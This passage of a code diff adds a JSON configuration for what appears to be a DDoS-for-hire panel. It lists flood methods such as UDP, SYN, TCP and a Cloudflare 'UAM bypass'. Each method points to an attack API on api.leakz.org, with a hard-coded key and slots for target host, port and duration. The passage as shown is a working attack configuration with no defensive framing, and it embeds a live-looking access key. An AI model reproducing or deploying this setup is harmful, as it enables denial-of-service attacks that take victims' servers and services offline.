+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovhudp",
+               "AttackName" : "LKZ-OVHUDP",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "killall",
+               "AttackName" : "LKZ-KILLALL",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "killallv2",
+               "AttackName" : "LKZ-KILLALLV2",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovhv2",
+               "AttackName" : "LKZ-OVHV2",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovhtcp",
+               "AttackName" : "LKZ-OVHTCP",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ltcp",
+               "AttackName" : "LKZ-LTCP",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "tcpb",
+               "AttackName" : "LKZ-TCPB",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "path",
+               "AttackName" : "LKZ-PATH",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "22-kill",
+               "AttackName" : "LKZ-22",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "syn",
+               "AttackName" : "LKZ-SYN",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "https",
+               "AttackName" : "LKZ-HTTPS",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "cf-bypass",
+               "AttackName" : "LKZ-UAMBYPASS",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          }
+     ]
+}
